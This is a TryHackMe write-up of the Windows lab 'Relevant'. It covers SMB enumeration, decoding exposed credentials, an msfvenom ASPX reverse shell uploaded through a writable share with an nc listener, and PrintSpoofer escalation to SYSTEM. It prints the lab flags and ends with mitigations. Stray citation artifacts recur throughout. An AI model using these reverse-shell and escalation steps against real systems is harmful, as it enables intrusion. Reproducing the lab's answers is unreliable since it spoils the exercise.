# TryHackMe - Relevant Writeup

> **Platform:** TryHackMe  
> **Machine:** Relevant  
> **Difficulty:** Medium  
> **OS:** Windows

---

# Scenario

The objective of this engagement is to perform a **black-box penetration test** against the provided Windows environment. Minimal information is available, requiring the assessment to mimic the perspective of a real-world attacker.

The client has requested two proof-of-compromise flags:

- `user.txt`
- `root.txt`

Target IP:

```text
10.49.133.32
```

:contentReference[oaicite:0]{index=0}

---

# Information Gathering

As always, the first step is identifying the exposed attack surface.

## Full Port Scan

```bash
nmap -p- 10.49.133.32
```

Output:

```text
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49663/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
```

Interesting observations:

| Port | Service |
|------|----------|
|80|HTTP|
|135|MSRPC|
|139|NetBIOS|
|445|SMB|
|3389|RDP|
|49663+|High Windows RPC Ports|

The presence of SMB and RDP immediately suggests that Windows enumeration will play an important role during the assessment. :contentReference[oaicite:1]{index=1}

---

# Service Enumeration

Next, perform service and version detection.

```bash
nmap -sC -sV 10.49.133.32
```

Important findings:

| Port | Service | Version |
|------|----------|---------|
|80|HTTP|Microsoft IIS 10.0|
|135|MSRPC|Microsoft Windows RPC|
|139|NetBIOS|Windows|
|445|SMB|Windows Server 2016|
|3389|RDP|Microsoft Terminal Services|

Additional information obtained:

- Microsoft IIS 10.0
- Windows Server 2016 Standard Evaluation
- RDP enabled
- SMB enabled
- HTTP TRACE method enabled

The machine is clearly a Windows Server 2016 host.

:contentReference[oaicite:2]{index=2}

---

# Web Enumeration

Browsing to port **80** displays the default IIS landing page.

No custom web application appears to be hosted on the root directory.

Because the page contains no useful functionality, the focus shifts toward the remaining exposed services.

Burp Suite is also launched to inspect HTTP requests, but nothing interesting is immediately identified.

:contentReference[oaicite:3]{index=3}

---

# SMB Enumeration

Since SMB is exposed externally, enumeration begins with anonymous access testing.

The initial SMB enumeration indicates that although anonymous sessions are denied, guest authentication is available.

```text
Server allows authentication via username
'nejdkirm'

Password:
<blank>
```

This suggests guest access may provide additional visibility into available shares.

:contentReference[oaicite:4]{index=4}

---

# Enumerating SMB Shares

List available SMB shares.

```bash
smbclient -L 10.49.133.32 -N
```

Output:

```text
ADMIN$
C$
IPC$
nt4wrksv
```

Most administrative shares are inaccessible without valid credentials.

However, one custom share immediately stands out.

```text
nt4wrksv
```

This becomes the primary target for further investigation.

:contentReference[oaicite:5]{index=5}

---

# Accessing the Share

Connect to the custom SMB share.

```bash
smbclient //10.49.133.32/nt4wrksv -N
```

List its contents.

```bash
ls
```

Output:

```text
passwords.txt
```

A file named **passwords.txt** is exposed through guest access.

This represents a significant information disclosure and is downloaded for analysis.

```bash
get passwords.txt
```

:contentReference[oaicite:6]{index=6}

---

# Credential Discovery

Viewing the file reveals two Base64-encoded strings.

```text
[User Passwords - Encoded]

Qm9iIC0gIVBAJCRXMHJEITEyMw==

QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
```

Decode each string.

```bash
echo "Qm9iIC0gIVBAJCRXMHJEITEyMw==" | base64 -d
```

```bash
echo "QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk" | base64 -d
```

Recovered credentials:

| User | Password |
|------|----------|
|Bob|`!P@$$W0rD!123`|
|Bill|`Juw4nnaM4n420696969!$$$`|

At this stage it is unclear where these credentials are intended to be used.

Possible targets include:

- SMB
- RDP
- Internal applications
- IIS authentication

These credentials are saved for later use.

:contentReference[oaicite:7]{index=7}

---

# Additional Web Enumeration

Before attempting to authenticate with the recovered credentials, further web enumeration is performed.

Gobuster is used to discover hidden files.

```bash
gobuster dir \
-u http://10.49.133.32 \
-w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-files.txt
```

Results:

```text
/
iisstart.htm
```

No custom directories or interesting files are discovered.

The IIS installation appears almost entirely default.

With the web server yielding little information, attention shifts back toward SMB and other Windows services.

:contentReference[oaicite:8]{index=8}

---

## Progress So Far

```text
Recon
    │
    ▼
Nmap Scan
    │
    ▼
Windows Server 2016
    │
    ▼
SMB Enumeration
    │
    ▼
Guest Access
    │
    ▼
nt4wrksv Share
    │
    ▼
passwords.txt
    │
    ▼
Recovered Credentials
    │
    ▼
Further Enumeration
```

---

---

# Further SMB Enumeration

Although the recovered credentials appeared promising, additional SMB enumeration was performed before attempting authentication.

Several SMB-related Nmap scripts were executed to gather more information about the target.

```bash
nmap -p135,139,445 --script=smb* 10.49.133.32
```

The scan revealed a wealth of information regarding the SMB service.

Among the notable findings:

- Windows Server 2016 Standard Evaluation
- Guest account authentication enabled
- SMBv1 supported
- Message signing disabled
- Read/Write access to the **nt4wrksv** share

Most importantly, one critical vulnerability was identified.

```text
MS17-010 (EternalBlue)

State:
VULNERABLE
```

The target is confirmed to be vulnerable to the infamous **EternalBlue** Remote Code Execution vulnerability.

This immediately presents two possible attack paths:

- Exploit MS17-010 directly.
- Investigate whether the writable SMB share can be leveraged for code execution.

Rather than immediately using EternalBlue, further enumeration of the writable share is performed.

:contentReference[oaicite:0]{index=0}

---

# Preparing an Initial Payload

A reverse shell payload is generated using **msfvenom**.

```bash
msfvenom \
-p windows/x64/shell_reverse_tcp \
LHOST=YOUR_IP \
LPORT=4444 \
-f exe \
-o exploit1.exe
```

The payload is successfully generated.

```text
Saved as:
exploit1.exe
```

An EternalBlue exploit repository is also cloned for testing.

```bash
git clone https://github.com/h3x0v3rl0rd/MS17-010_CVE-2017-0143.git
```

Although this provides an exploitation option, another attack path ultimately proves to be simpler.

:contentReference[oaicite:1]{index=1}

---

# Uploading a Web Shell

Since the writable SMB share appears to be associated with the IIS web server, an ASPX payload is generated instead.

```bash
msfvenom \
-p windows/x64/shell_reverse_tcp \
LHOST=YOUR_IP \
LPORT=4444 \
-f aspx \
-o exploit.aspx
```

Output:

```text
Saved as:
exploit.aspx
```

Unlike a standalone executable, an ASPX payload can execute directly through Microsoft's IIS server if uploaded into the web root.

:contentReference[oaicite:2]{index=2}

---

# Uploading the Payload

Reconnect to the writable SMB share.

```bash
smbclient //10.49.133.32/nt4wrksv -N
```

Upload the payload.

```bash
put exploit.aspx
```

Output:

```text
putting file exploit.aspx
```

The upload completes successfully.

This strongly suggests that the SMB share maps directly to a directory served by IIS.

:contentReference[oaicite:3]{index=3}

---

# Triggering the Payload

Browse to the uploaded ASPX file.

```text
http://10.49.133.32:49663/nt4wrksv/exploit.aspx
```

Before opening the page, start a Netcat listener.

```bash
rlwrap nc -lvnp 4444
```

As soon as the page is requested, the reverse shell connects back.

```text
Microsoft Windows

Version 10.0.14393
```

Current working directory:

```text
C:\Windows\System32\inetsrv>
```

Initial code execution on the target has now been achieved.

:contentReference[oaicite:4]{index=4}

---

# Upgrading the Shell

Although the initial command shell is functional, PowerShell provides significantly better capabilities for post-exploitation.

Launch PowerShell.

```cmd
powershell.exe
```

This enables:

- Better filesystem navigation
- Improved command execution
- Easier privilege enumeration
- PowerShell scripting support

The shell is now much more suitable for further exploitation.

:contentReference[oaicite:5]{index=5}

---

# Retrieving the User Flag

Navigate to Bob's desktop.

```powershell
cd C:\Users\Bob\Desktop
```

Read the user flag.

```powershell
cat user.txt
```

Output:

```text
THM{fdk4ka34vk346ksxfr21tg789ktf45}
```

The first objective of the engagement has now been completed successfully.

:contentReference[oaicite:6]{index=6}

---

# Beginning Privilege Escalation

With code execution obtained and the user flag secured, the next phase is identifying a privilege escalation vector.

The first step is enumerating the privileges assigned to the current account.

Windows token privileges frequently reveal opportunities for local privilege escalation.

This is especially true for service accounts running IIS.

The `whoami /priv` command is used to inspect the current security token.

The results of this enumeration will determine the most appropriate privilege escalation technique.

:contentReference[oaicite:7]{index=7}

---

## Progress So Far

```text
Recon
    │
    ▼
Nmap Scan
    │
    ▼
SMB Enumeration
    │
    ▼
Writable SMB Share
    │
    ▼
Encoded Credentials
    │
    ▼
SMB Vulnerability Scan
    │
    ▼
MS17-010 Identified
    │
    ▼
ASPX Payload
    │
    ▼
SMB Upload
    │
    ▼
Reverse Shell
    │
    ▼
PowerShell
    │
    ▼
User Flag
```

---

# Privilege Escalation

With an interactive PowerShell session established and the user flag secured, the next objective is obtaining **SYSTEM** privileges.

The first step is enumerating the privileges assigned to the current security token.

---

# Enumerating User Privileges

Run the following command.

```cmd
whoami /priv
```

Output:

```text
Privilege Name                          State
=====================================   =========

SeAssignPrimaryTokenPrivilege           Disabled
SeIncreaseQuotaPrivilege                Disabled
SeAuditPrivilege                        Disabled
SeChangeNotifyPrivilege                 Enabled
SeImpersonatePrivilege                  Enabled
SeCreateGlobalPrivilege                 Enabled
SeIncreaseWorkingSetPrivilege           Disabled
```

The most important privilege here is:

```text
SeImpersonatePrivilege
```

This privilege has historically been responsible for numerous Windows privilege escalation techniques.

When enabled, it allows a process to impersonate another authenticated user under specific conditions.

This immediately suggests exploiting one of the well-known **Potato-family** attacks or **PrintSpoofer**.

:contentReference[oaicite:0]{index=0}

---

# Choosing the Exploit

Among the available privilege escalation techniques, **PrintSpoofer** is particularly well suited for Windows Server 2016 systems when **SeImpersonatePrivilege** is enabled.

PrintSpoofer abuses the Windows Print Spooler service to obtain a SYSTEM token and spawn a process running with full privileges.

The executable can be downloaded from the official repository.

```text
PrintSpoofer.exe
```

Rather than downloading it directly onto the target, it is uploaded through the writable SMB share that was previously discovered.

:contentReference[oaicite:1]{index=1}

---

# Uploading PrintSpoofer

Reconnect to the writable SMB share.

```bash
smbclient //10.49.133.32/nt4wrksv -N
```

Upload the binary.

```bash
put PrintSpoofer.exe
```

Verify the upload.

```text
.
..
exploit.aspx
passwords.txt
PrintSpoofer.exe
```

The binary is now accessible from the IIS web directory and can be executed from the reverse shell.

:contentReference[oaicite:2]{index=2}

---

# Executing PrintSpoofer

Return to the reverse shell and navigate to the directory containing the uploaded executable.

Execute:

```cmd
PrintSpoofer.exe -i -c cmd
```

Output:

```text
[+] Found privilege:

SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK
```

Immediately afterward, a new command prompt is spawned.

```text
Microsoft Windows

Version 10.0.14393
```

This indicates that the exploit completed successfully.

:contentReference[oaicite:3]{index=3}

---

# Verifying SYSTEM Access

Confirm the identity of the new process.

```cmd
whoami
```

Output:

```text
nt authority\system
```

The privilege escalation is now complete.

The shell is executing as the highest privileged account available on the system.

No additional exploitation is required.

:contentReference[oaicite:4]{index=4}

---

# Locating the Root Flag

With SYSTEM privileges obtained, administrative directories become fully accessible.

Navigate to the Administrator desktop.

```powershell
cd C:\Users\Administrator\Desktop
```

The remaining objective is retrieving the final proof of compromise.

:contentReference[oaicite:5]{index=5}

---

## Progress So Far

```text
Recon
    │
    ▼
Nmap Scan
    │
    ▼
SMB Enumeration
    │
    ▼
Guest Share Access
    │
    ▼
Recovered Credentials
    │
    ▼
Writable SMB Share
    │
    ▼
ASPX Reverse Shell
    │
    ▼
PowerShell
    │
    ▼
User Flag
    │
    ▼
Privilege Enumeration
    │
    ▼
SeImpersonatePrivilege
    │
    ▼
PrintSpoofer
    │
    ▼
SYSTEM Shell
```

---

# Root Flag

Now that the shell is running as **NT AUTHORITY\SYSTEM**, the final objective is retrieving the root flag.

Navigate to the Administrator's Desktop.

```powershell
cd C:\Users\Administrator\Desktop
```

Read the flag.

```powershell
cat root.txt
```

Output:

```text
THM{1fk5kf469devly1gl320zafgl345pv}
```

The machine has now been fully compromised with SYSTEM-level privileges. :contentReference[oaicite:0]{index=0}

---

# Flags

## User Flag

```text
THM{fdk4ka34vk346ksxfr21tg789ktf45}
```

---

## Root Flag

```text
THM{1fk5kf469devly1gl320zafgl345pv}
```

---

# Complete Attack Path

```text
Recon
      │
      ▼
Nmap Scan
      │
      ▼
Windows Server 2016
      │
      ▼
SMB Enumeration
      │
      ▼
Guest Access
      │
      ▼
Writable SMB Share
      │
      ▼
passwords.txt
      │
      ▼
Base64 Credential Recovery
      │
      ▼
Further SMB Enumeration
      │
      ▼
MS17-010 Identified
      │
      ▼
Writable IIS Share
      │
      ▼
ASPX Reverse Shell
      │
      ▼
PowerShell Shell
      │
      ▼
User Flag
      │
      ▼
Privilege Enumeration
      │
      ▼
SeImpersonatePrivilege
      │
      ▼
PrintSpoofer
      │
      ▼
NT AUTHORITY\SYSTEM
      │
      ▼
Root Flag
```

---

# Vulnerabilities Identified

| Vulnerability | Impact |
|--------------|--------|
|Guest-accessible SMB share|Allowed attackers to enumerate and access sensitive files|
|Information disclosure|Exposed encoded user credentials through a publicly accessible share|
|Writable SMB share|Permitted arbitrary file uploads to the web server|
|Insecure IIS configuration|Executed uploaded ASPX files, resulting in remote code execution|
|Enabled SeImpersonatePrivilege|Allowed local privilege escalation using PrintSpoofer|
|SMBv1 enabled|Exposed the server to legacy SMB attack vectors, including MS17-010|
|Message signing disabled|Reduced SMB security and increased attack surface|

---

# Tools Used

## Reconnaissance

- Nmap
- Gobuster
- Burp Suite

## SMB Enumeration

- smbclient
- Nmap NSE Scripts
- Base64

## Exploitation

- msfvenom
- Netcat
- PowerShell

## Privilege Escalation

- PrintSpoofer
- whoami

---

# Important Commands

## Full Port Scan

```bash
nmap -p- 10.49.133.32
```

---

## Service Enumeration

```bash
nmap -sC -sV 10.49.133.32
```

---

## Enumerate SMB Shares

```bash
smbclient -L 10.49.133.32 -N
```

---

## Access Writable Share

```bash
smbclient //10.49.133.32/nt4wrksv -N
```

---

## Download passwords.txt

```bash
get passwords.txt
```

---

## Decode Base64 Credentials

```bash
echo "<base64>" | base64 -d
```

---

## SMB Enumeration Scripts

```bash
nmap -p135,139,445 --script=smb* 10.49.133.32
```

---

## Generate ASPX Reverse Shell

```bash
msfvenom \
-p windows/x64/shell_reverse_tcp \
LHOST=<YOUR_IP> \
LPORT=4444 \
-f aspx \
-o exploit.aspx
```

---

## Upload Payload

```bash
put exploit.aspx
```

---

## Trigger Reverse Shell

```text
http://TARGET_IP:49663/nt4wrksv/exploit.aspx
```

---

## Start Listener

```bash
rlwrap nc -lvnp 4444
```

---

## Enumerate Windows Privileges

```cmd
whoami /priv
```

---

## Upload PrintSpoofer

```bash
put PrintSpoofer.exe
```

---

## Obtain SYSTEM Shell

```cmd
PrintSpoofer.exe -i -c cmd
```

---

## Verify Privileges

```cmd
whoami
```

---

# Lessons Learned

- SMB enumeration should always be prioritized on Windows targets, as exposed shares frequently reveal sensitive information.
- Guest access can unintentionally expose configuration files, credentials, or writable directories.
- Base64 encoding is **not** encryption and should never be used to protect sensitive credentials.
- Writable SMB shares mapped to IIS web directories can provide a straightforward path to remote code execution through uploaded ASPX payloads.
- Enumerating Windows token privileges with `whoami /priv` is essential after obtaining an initial shell, as privileges like **SeImpersonatePrivilege** often lead directly to SYSTEM.
- Legacy services such as **SMBv1** significantly increase the attack surface and should be disabled whenever possible.

---

# Mitigation Recommendations

## SMB Security

- Disable guest access to SMB shares.
- Remove unnecessary writable shares.
- Disable SMBv1.
- Enable SMB message signing.

## Web Server Security

- Prevent execution of user-uploaded files.
- Restrict upload locations from web-accessible directories.
- Validate uploaded file types.

## Credential Management

- Never store credentials using reversible encodings such as Base64.
- Store secrets securely using appropriate credential management solutions.

## Windows Hardening

- Remove unnecessary privileges such as `SeImpersonatePrivilege` where possible.
- Apply Microsoft's latest security updates.
- Monitor for abnormal token impersonation activity.

## Monitoring

- Alert on unexpected ASPX uploads.
- Monitor SMB write operations.
- Log privilege escalation attempts involving impersonation privileges.

---

# Conclusion

Relevant demonstrates how a series of individually manageable weaknesses can be chained into a complete system compromise.

The attack began with standard network reconnaissance, revealing exposed SMB and IIS services on a Windows Server 2016 host. A guest-accessible SMB share exposed Base64-encoded credentials and, more importantly, provided write access to a directory served by IIS. By uploading a malicious ASPX reverse shell and executing it through the web server, initial code execution was achieved without exploiting EternalBlue, despite the system being vulnerable to **MS17-010**.

After obtaining a foothold, privilege enumeration revealed the presence of **SeImpersonatePrivilege**, allowing the use of **PrintSpoofer** to impersonate a privileged token and spawn a **SYSTEM** shell. From there, the root flag was retrieved, completing the engagement.

This machine highlights the importance of securing SMB shares, avoiding writable web directories, disabling legacy protocols, and carefully managing Windows privileges.

---

# Skills Practiced

- Network Enumeration
- Windows Service Enumeration
- SMB Enumeration
- Guest Share Analysis
- Base64 Credential Analysis
- IIS Enumeration
- File Upload Exploitation
- ASPX Reverse Shell Generation
- PowerShell Post-Exploitation
- Windows Privilege Enumeration
- PrintSpoofer Exploitation
- SYSTEM Privilege Escalation

---

**Machine:** Relevant  
**Platform:** TryHackMe  
**Operating System:** Windows  
**Difficulty:** Medium

---

> *Thank you for reading this write-up. I hope you found it useful and learned something new. Feel free to connect or reach out if you'd like to discuss the methodology or share feedback.*
